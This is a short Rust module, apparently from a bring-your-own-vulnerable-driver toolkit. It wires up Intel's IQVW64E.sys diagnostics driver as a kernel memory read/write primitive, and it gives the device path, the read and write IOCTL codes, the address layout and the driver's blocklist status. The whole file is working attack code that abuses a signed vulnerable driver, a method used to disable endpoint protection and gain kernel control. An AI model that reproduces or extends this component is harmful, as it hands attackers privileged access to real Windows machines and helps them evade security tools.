//! IQVW64E.sys — Intel Ethernet diagnostics (CVE-2022-24245).
//!
//! **Status: blocklisted.** Less flagged than RTCore64 historically,
//! but on the Microsoft Vulnerable Driver Blocklist since 2023.
//!
//! Device: `\\.\iqvw64e`
//! Read:  0x80802010
//! Write: 0x80802014
//! Layout: address at offset 0x00 (different from RTCore64).

use crate::byovd::VulnDriverIoctl;

pub struct Iqvw64e;

impl VulnDriverIoctl for Iqvw64e {
    fn device_path(&self) -> &[u16] {
        static PATH: [u16; 11] = [
            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
            'i' as u16, 'q' as u16, 'v' as u16, 'w' as u16,
            '6' as u16, '4' as u16, 'e' as u16,
        ];
        &PATH
    }
    fn read_ioctl(&self) -> u32 { 0x80802010 }
    fn write_ioctl(&self) -> u32 { 0x80802014 }
    fn addr_offset(&self) -> usize { 0x00 }
    fn blocklist_status(&self) -> &'static str {
        "BLOCKLISTED: on Microsoft Vulnerable Driver Blocklist since 2023"
    }
}
